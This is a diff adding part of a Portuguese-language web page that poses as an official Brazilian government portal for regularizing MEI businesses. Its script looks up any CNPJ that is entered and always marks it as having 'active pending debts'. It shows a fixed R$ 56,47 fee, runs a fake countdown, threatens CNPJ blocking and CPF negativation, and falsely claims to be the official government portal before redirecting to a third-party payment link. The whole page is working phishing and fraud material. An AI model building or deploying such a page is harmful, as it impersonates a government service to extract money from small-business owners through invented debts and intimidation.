+                                    <!-- Dados serão preenchidos dinamicamente -->
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- SEÇÃO: Comunicado sobre Pendências -->
+                        <div class="fee-notice-section">
+                            <div class="fee-notice-header">
+                                <i class="fas fa-info-circle fee-notice-icon"></i>
+                                <h3 class="fee-notice-title">Pendências Ativas</h3>
+                            </div>
+                            <div class="fee-notice-content">
+                                <p class="fee-notice-text">
+                                    Para regularizar a situação do seu MEI, é necessário o pagamento do valor total das pendências identificadas. 
+                                </p>
+                                
+                                <div class="fee-highlight-box">
+                                    <div class="fee-amount">R$ 56,47</div>
+                                    <div class="fee-description">Valor total das pendências ativas</div>
+                                </div>
+
+                                <p class="fee-notice-text">
+                                    <strong>O que está incluído na regularização:</strong>
+                                </p>
+                                
+                                <ul class="fee-benefits-list">
+                                    <li>Quitação de débitos em atraso</li>
+                                    <li>Atualização cadastral no Portal do Empreendedor</li>
+                                    <li>Emissão do Certificado de Regularidade</li>
+                                    <li>Evita o cancelamento definitivo do CNPJ</li>
+                                </ul>
+
+                                <p class="fee-notice-text">
+                                    <strong>Importante:</strong> Este valor refere-se às pendências acumuladas até a data atual. 
+                                    O não pagamento acarretará no bloqueio do CNPJ e negativação do CPF do titular.
+                                </p>
+                            </div>
+                        </div>
+
+                        <div class="declaration-section">
+                            <h3 class="declaration-title">
+                                <i class="fas fa-exclamation-triangle"></i>
+                                Declaração e Termos
+                            </h3>
+                            <p class="declaration-text">
+                                Ao prosseguir, você declara que leu e aceita os Termos de Uso e a Política de Privacidade, 
+                                confirma que as informações fornecidas são verdadeiras e autoriza o processamento dos seus 
+                                dados conforme a Lei Geral de Proteção de Dados (LGPD).
+                            </p>
+                            
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="termsAccept" name="termsAccept" class="checkbox-input" required>
+                                <label for="termsAccept" class="checkbox-label">
+                                    Declaro que li e aceito os <strong>Termos de Uso</strong> e a <strong>Política de Privacidade</strong>
+                                </label>
+                            </div>
+                            
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="dataAccuracy" name="dataAccuracy" class="checkbox-input" required>
+                                <label for="dataAccuracy" class="checkbox-label">
+                                    Confirmo que as informações fornecidas são <strong>verdadeiras</strong>
+                                </label>
+                            </div>
+
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="lgpdAccept" name="lgpdAccept" class="checkbox-input" required>
+                                <label for="lgpdAccept" class="checkbox-label">
+                                    Autorizo o processamento de dados conforme a <strong>Lei Geral de Proteção de Dados (LGPD)</strong>
+                                </label>
+                            </div>
+                        </div>
+
+                        <form id="confirmationForm">
+                            <div class="button-group">
+                                <button type="button" id="btn-voltar" class="btn btn-secondary">
+                                    <i class="fas fa-arrow-left"></i>
+                                    Voltar
+                                </button>
+                                <button type="submit" id="btn-pagar" class="btn btn-primary">
+                                    <i class="fas fa-lock"></i>
+                                    Pagar Agora
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Sidebar (Desktop) -->
+        <aside class="sidebar">
+            <!-- Resumo de Valores -->
+            <div class="summary-card">
+                <div class="summary-title">Resumo da Regularização</div>
+                <div class="price-display">
+                    <div class="price-label">Valor Total</div>
+                    <div class="price-value" id="sidebarPrice">R$ 56,47</div>
+                </div>
+            </div>
+
+            <!-- Seção de Confiança -->
+            <div class="trust-section">
+                <div class="trust-title">Por que confiar?</div>
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div>Portal oficial do governo</div>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div>Certificado SSL 256-bit</div>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div>Dados protegidos por LGPD</div>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div>Processamento 100% seguro</div>
+                </div>
+            </div>
+        </aside>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Processando seu pagamento...</div>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE_URL = 'https://brasilapi.com.br/api/cnpj/v1';
+        const API_KEY = '';
+        
+        let cnpjData = null;
+        let isProcessing = false;
+        let currentStep = 1;
+
+        function goToStep(stepNumber) {
+            const steps = document.querySelectorAll('.step-content');
+            const progressSteps = document.querySelectorAll('.step');
+            const progressLineActive = document.getElementById('progressLineActive');
+
+            steps.forEach((step, index) => {
+                step.classList.remove('active');
+                if (index + 1 === stepNumber) {
+                    step.classList.add('active');
+                }
+            });
+
+            progressSteps.forEach((step, index) => {
+                const stepNumber_attr = step.getAttribute('data-step');
+                step.classList.remove('active', 'completed');
+                
+                if (parseInt(stepNumber_attr) === stepNumber) {
+                    step.classList.add('active');
+                } else if (parseInt(stepNumber_attr) < stepNumber) {
+                    step.classList.add('completed');
+                }
+            });
+
+            const progressWidth = ((stepNumber - 1) / (progressSteps.length - 1)) * 100;
+            if (progressLineActive) {
+                progressLineActive.style.width = `${progressWidth}%`;
+            }
+
+            currentStep = stepNumber;
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function applyCNPJMask(value) {
+            return value
+                .replace(/\D/g, '')
+                .replace(/^(\d{2})(\d)/, '$1.$2')
+                .replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3')
+                .replace(/\.(\d{3})(\d)/, '.$1/$2')
+                .replace(/(\d{4})(\d)/, '$1-$2');
+        }
+
+        async function handleCNPJLookup() {
+            const cnpjInput = document.getElementById('cnpj');
+            const cnpj = cnpjInput.value.replace(/\D/g, '');
+            const loadingIndicator = document.getElementById('cnpjLoadingIndicator');
+            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
+            const waitingPayment = document.getElementById('waitingPayment');
+            const errorEl = document.getElementById('cnpjError');
+
+            if (cnpj.length !== 14) {
+                cnpjInfoDisplay.style.display = 'none';
+                waitingPayment.style.display = 'none';
+                cnpjInput.classList.remove('success');
+                if (errorEl) errorEl.classList.remove('show');
+                return;
+            }
+
+            if (isProcessing) return;
+            isProcessing = true;
+
+            if (loadingIndicator) {
+                loadingIndicator.classList.add('show');
+            }
+
+            try {
+                const url = `${API_BASE_URL}/${cnpj}`;
+                const response = await fetch(url, {
+                    signal: AbortSignal.timeout(5000)
+                });
+
+                await new Promise(resolve => setTimeout(resolve, 400));
+
+                if (!response.ok) {
+                    throw new Error('CNPJ não encontrado ou inválido.');
+                }
+
+                const data = await response.json();
+                cnpjData = data;
+                displayCNPJInfo(data, cnpjInput.value);
+                cnpjInput.classList.add('success');
+                cnpjInput.classList.remove('error');
+                if (errorEl) errorEl.classList.remove('show');
+                cnpjInfoDisplay.style.display = 'block';
+                waitingPayment.style.display = 'block';
+                startCountdown();
+
+            } catch (error) {
+                console.error('Erro ao buscar CNPJ:', error);
+                showCNPJError('CNPJ não encontrado. Verifique e tente novamente.');
+            } finally {
+                if (loadingIndicator) {
+                    loadingIndicator.classList.remove('show');
+                }
+                isProcessing = false;
+            }
+        }
+
+        function displayCNPJInfo(data, formattedCnpj) {
+            const cnpjInfoGrid = document.getElementById('cnpjInfoGrid');
+            const paymentCnpjInfoGrid = document.getElementById('paymentCnpjInfoGrid');
+
+            const infoItems = [
+                { label: 'CNPJ', value: formattedCnpj || data.cnpj || '-' },
+                { label: 'Situação', value: '<span class="status-pending">Pendências Ativas</span>' },
+                { label: 'Razão Social', value: data.name || '-' },
+                { label: 'Natureza Jurídica', value: 'MEI' },
+                { label: 'Data de Abertura', value: data.founded || '-' },
+                { label: 'Atividade Principal', value: data.mainActivity?.description || '-' },
+                { label: 'Endereço', value: `${data.address?.street || ''}, ${data.address?.number || ''} - ${data.address?.city || ''}/${data.address?.state || ''}`.trim() }
+            ];
+
+            const htmlContent = infoItems.map(item => `
+                <div class="cnpj-info-item">
+                    <span class="cnpj-info-label">${item.label}</span>
+                    <span class="cnpj-info-value">${item.value}</span>
+                </div>
+            `).join('');
+
+            if (cnpjInfoGrid) cnpjInfoGrid.innerHTML = htmlContent;
+            if (paymentCnpjInfoGrid) paymentCnpjInfoGrid.innerHTML = htmlContent;
+        }
+
+        let countdownInterval;
+        const initialTimeSeconds = 43 * 60 + 27;
+
+        function startCountdown() {
+            let timeRemaining = initialTimeSeconds;
+            const timerDisplay = document.getElementById('countdownTimer');
+
+            function updateTimer() {
+                const minutes = Math.floor(timeRemaining / 60);
+                const seconds = timeRemaining % 60;
+                const formattedTime = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                
+                if (timerDisplay) timerDisplay.textContent = formattedTime;
+
+                if (timeRemaining <= 0) {
+                    clearInterval(countdownInterval);
+                } else {
+                    timeRemaining--;
+                }
+            }
+
+            updateTimer();
+            countdownInterval = setInterval(updateTimer, 1000);
+        }
+
+        function showCNPJError(message) {
+            const cnpjInput = document.getElementById('cnpj');
+            const errorEl = document.getElementById('cnpjError');
+            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
+            const waitingPayment = document.getElementById('waitingPayment');
+
+            cnpjInput.classList.add('error');
+            cnpjInput.classList.remove('success');
+            if (errorEl) {
+                errorEl.textContent = message;
+                errorEl.classList.add('show');
+            }
+            cnpjInfoDisplay.style.display = 'none';
+            waitingPayment.style.display = 'none';
+        }
+
+        function handleCNPJFormSubmit(e) {
+            e.preventDefault();
+        }
+
+        async function handleConfirmationSubmit(e) {
+            e.preventDefault();
+
+            const checkboxes = e.target.querySelectorAll('input[type="checkbox"][required]');
+            let allChecked = true;
+
+            checkboxes.forEach(checkbox => {
+                if (!checkbox.checked) {
+                    allChecked = false;
+                    checkbox.style.outline = '2px solid var(--error-color)';
+                } else {
+                    checkbox.style.outline = 'none';
+                }
+            });
+
+            if (!allChecked) {
+                alert('Por favor, aceite todos os termos para continuar.');
+                return;
+            }
+
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            if (loadingOverlay) loadingOverlay.classList.add('show');
+
+            try {
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                window.location.href = 'https://pay.pag-br.com/r/416j168GRnh652r6fbg9';
+            } catch (error) {
+                console.error('Erro:', error);
+                alert('Erro ao processar. Tente novamente.');
+            } finally {
+                if (loadingOverlay) loadingOverlay.classList.remove('show');
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const cnpjForm = document.getElementById('cnpjForm');
+            if (cnpjForm) {
+                cnpjForm.addEventListener('submit', handleCNPJFormSubmit);
+
+                const prosseguirBtn = document.getElementById('btn-prosseguir');
+                if (prosseguirBtn) {
+                    prosseguirBtn.addEventListener('click', () => {
+                        if (cnpjData) {
+                            goToStep(2);
+                        } else {
+                            showCNPJError('Por favor, digite um CNPJ válido antes de prosseguir.');
+                        }
+                    });
+                }
+            }
+
+            const cnpjInput = document.getElementById('cnpj');
+            if (cnpjInput) {
+                cnpjInput.addEventListener('input', function(e) {
+                    const cursorPosition = e.target.selectionStart;
+                    const oldValue = e.target.value;
+                    const newValue = applyCNPJMask(oldValue);
+
+                    if (newValue !== oldValue) {
+                        e.target.value = newValue;
+                        const newCursorPosition = cursorPosition + (newValue.length - oldValue.length);
+                        e.target.setSelectionRange(newCursorPosition, newCursorPosition);
+                    }
+
+                    if (newValue.replace(/\D/g, '').length === 14) {
+                        handleCNPJLookup();
+                    }
+                });
+            }
+
+            const voltarBtn = document.getElementById('btn-voltar');
+            if (voltarBtn) {
+                voltarBtn.addEventListener('click', () => goToStep(1));
+            }
+
+            const confirmationForm = document.getElementById('confirmationForm');
+            if (confirmationForm) {
+                confirmationForm.addEventListener('submit', handleConfirmationSubmit);
+            }
+        });
+    </script>
+
+</body>
+</html>
